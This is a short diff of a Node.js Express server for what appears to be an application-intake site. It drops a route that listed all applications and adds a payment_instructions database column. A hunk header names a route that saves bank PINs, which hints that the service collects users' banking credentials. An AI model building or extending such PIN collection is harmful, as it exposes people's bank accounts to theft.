@@ -394,37 +394,7 @@ app.post("/submit-application", async (req, res) => {
     }
 
 });
-// ======================================================
-// GET ALL APPLICATIONS
-// ======================================================
 
-app.get("/applications", async (req, res) => {
-
-    try {
-
-        const result = await pool.query(`
-            SELECT *
-            FROM applications
-            ORDER BY created_at DESC
-        `);
-
-        res.json({
-            success: true,
-            applications: result.rows
-        });
-
-    } catch (err) {
-
-        console.error("LOAD APPLICATIONS ERROR:", err);
-
-        res.status(500).json({
-            success: false,
-            error: err.message
-        });
-
-    }
-
-});
 // ======================================================
 // DELETE ALL APPLICATIONS
 // ======================================================
@@ -1876,6 +1846,36 @@ app.post("/save-bank-pin/:id", async (req, res) => {
     }
 
 });
+// ==========================================
+// PAYMENT INSTRUCTIONS FIELD
+// ==========================================
+
+async function addPaymentInstructionsField() {
+
+    try {
+
+        await pool.query(`
+            ALTER TABLE applications
+            ADD COLUMN IF NOT EXISTS
+                payment_instructions TEXT;
+        `);
+
+        console.log(
+            "✅ payment_instructions field ready."
+        );
+
+    } catch (error) {
+
+        console.error(
+            "❌ PAYMENT INSTRUCTIONS FIELD ERROR:",
+            error
+        );
+
+    }
+
+}
+
+addPaymentInstructionsField();
 // ======================================================
 // START SERVER
 // ======================================================
